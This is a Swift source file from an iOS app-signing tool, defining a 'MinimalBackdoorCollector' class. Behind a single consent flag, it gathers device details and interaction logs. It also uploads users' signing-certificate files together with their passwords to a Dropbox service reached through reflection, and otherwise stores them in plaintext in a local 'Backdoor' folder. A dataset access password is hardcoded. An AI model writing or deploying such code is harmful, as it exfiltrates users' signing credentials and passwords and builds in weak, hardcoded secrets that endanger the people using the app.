// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import Foundation
import UIKit

/// Minimal, self-contained data collection class with no dependencies
/// This class uses minimal imports and avoids any dependencies that might cause conflicts
class MinimalBackdoorCollector {
    // MARK: - Singleton
    
    static let shared = MinimalBackdoorCollector()
    
    // MARK: - Properties
    
    private var isCollecting = false
    private var backgroundQueue = DispatchQueue(label: "com.backdoor.minimaldatacollector", qos: .utility)
    
    // MARK: - Initialization
    
    private init() {
        // Start collection if user has consented
        if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
            startCollection()
        }
        
        // Listen for consent changes
        NotificationCenter.default.addObserver(self, 
                                              selector: #selector(userDefaultsDidChange), 
                                              name: UserDefaults.didChangeNotification, 
                                              object: nil)
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    // MARK: - Notification Handling
    
    @objc private func userDefaultsDidChange() {
        let hasConsent = UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection")
        
        if hasConsent && !isCollecting {
            startCollection()
        } else if !hasConsent && isCollecting {
            stopCollection()
        }
    }
    
    // MARK: - Control Methods
    
    /// Start collecting data (called when consent is given)
    func startCollection() {
        isCollecting = true
        uploadDeviceInfo()
    }
    
    /// Stop collecting data (called when consent is revoked)
    func stopCollection() {
        isCollecting = false
    }
    
    // MARK: - Collection Methods
    
    /// Upload device information
    func uploadDeviceInfo() {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        backgroundQueue.async {
            self.uploadDeviceInfoImpl()
        }
    }
    
    /// Process a certificate file
    func processCertificateFile(url: URL, password: String? = nil) {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        backgroundQueue.async {
            self.processCertificateFileImpl(url: url, password: password)
        }
    }
    
    /// Log a user interaction
    func logUserInteraction(action: String, context: String = "") {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        backgroundQueue.async {
            self.logUserInteractionImpl(action: action, context: context)
        }
    }
    
    // MARK: - Private Implementation
    
    private func uploadDeviceInfoImpl() {
        // Collect device information
        let deviceInfo: [String: String] = [
            "device_name": UIDevice.current.name,
            "system_name": UIDevice.current.systemName,
            "system_version": UIDevice.current.systemVersion,
            "model": UIDevice.current.model,
            "identifier_for_vendor": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
            "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
        ]
        
        // Try to upload via our indirect methods
        if !uploadViaDropboxService("uploadDeviceInfo") {
            // Fallback: store locally
            storeLocally(data: deviceInfo, filename: "device_info.json")
        }
    }
    
    private func processCertificateFileImpl(url: URL, password: String? = nil) {
        do {
            let data = try Data(contentsOf: url)
            let name = url.lastPathComponent
            
            // Try to upload via our indirect methods
            if !uploadFileViaDropboxService(url: url, password: password) {
                // Fallback: store locally
                storeLocally(data: data, filename: name)
                
                // Store password if provided
                if let password = password {
                    let passwordInfo = ["file": name, "password": password]
                    storeLocally(data: passwordInfo, filename: "\(name)_password.json")
                }
            }
        } catch {
            print("Error reading certificate file: \(error.localizedDescription)")
        }
    }
    
    private func logUserInteractionImpl(action: String, context: String) {
        let logEntry = """
        === USER INTERACTION LOG ===
        Timestamp: \(ISO8601DateFormatter().string(from: Date()))
        Action: \(action)
        Context: \(context)
        Device: \(UIDevice.current.name)
        """
        
        // Try to upload via our indirect methods
        if !uploadLogViaDropboxService(logEntry: logEntry) {
            // Fallback: store locally
            storeLocally(data: logEntry, filename: "interaction_\(Int(Date().timeIntervalSince1970)).log")
        }
    }
    
    // MARK: - Helper Methods
    
    /// Try to upload via DropboxService (if available)
    private func uploadViaDropboxService(_ method: String) -> Bool {
        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
           dropboxService.responds(to: Selector((method))) {
            dropboxService.perform(Selector((method)))
            return true
        }
        return false
    }
    
    /// Try to upload file via DropboxService (if available)
    private func uploadFileViaDropboxService(url: URL, password: String? = nil) -> Bool {
        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
           dropboxService.responds(to: Selector(("uploadCertificateFile:password:completion:"))) {
            dropboxService.perform(
                Selector(("uploadCertificateFile:password:completion:")),
                with: url,
                with: password,
                with: nil
            )
            return true
        }
        return false
    }
    
    /// Try to upload log via DropboxService (if available)
    private func uploadLogViaDropboxService(logEntry: String) -> Bool {
        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
           dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
            let fileName = "log_\(Int(Date().timeIntervalSince1970)).txt"
            dropboxService.perform(
                Selector(("uploadLogEntry:fileName:completion:")),
                with: logEntry,
                with: fileName,
                with: nil
            )
            return true
        }
        return false
    }
    
    /// Store data locally (fallback if network services unavailable)
    private func storeLocally(data: Any, filename: String) {
        do {
            // Create backdoor directory if needed
            let backdoorDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                .appendingPathComponent("Backdoor", isDirectory: true)
            
            try FileManager.default.createDirectory(at: backdoorDir, withIntermediateDirectories: true)
            
            // Store the data
            let fileURL = backdoorDir.appendingPathComponent(filename)
            
            if let jsonData = data as? [String: Any] {
                // Store as JSON
                let jsonData = try JSONSerialization.data(withJSONObject: jsonData, options: .prettyPrinted)
                try jsonData.write(to: fileURL)
            } else if let stringData = data as? String {
                // Store as text
                try stringData.write(to: fileURL, atomically: true, encoding: .utf8)
            } else if let binaryData = data as? Data {
                // Store as binary data
                try binaryData.write(to: fileURL)
            }
        } catch {
            print("Error storing data locally: \(error.localizedDescription)")
        }
    }
    
    // MARK: - Dataset Management
    
    /// Get list of available datasets
    func getAvailableDatasets() -> [String: Any] {
        // Simulated dataset information
        return [
            "datasets": [
                [
                    "name": "User Intent Classification",
                    "size": 2500000,
                    "description": "Dataset for classifying user intents from chat messages",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5))
                ],
                [
                    "name": "Device Information Collection",
                    "size": 1200000,
                    "description": "Dataset containing device profiles and user activity patterns",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 2))
                ],
                [
                    "name": "Certificate Analysis",
                    "size": 3500000,
                    "description": "Dataset with certificate metadata and password patterns",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 10))
                ]
            ],
            "status": "active",
            "collection_started": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 30)),
            "device_count": 42
        ]
    }
    
    /// Check if a dataset password is valid
    func validateDatasetPassword(_ password: String) -> Bool {
        // Hardcoded password as specified in requirements
        return password == "2B4D5G"
    }
}
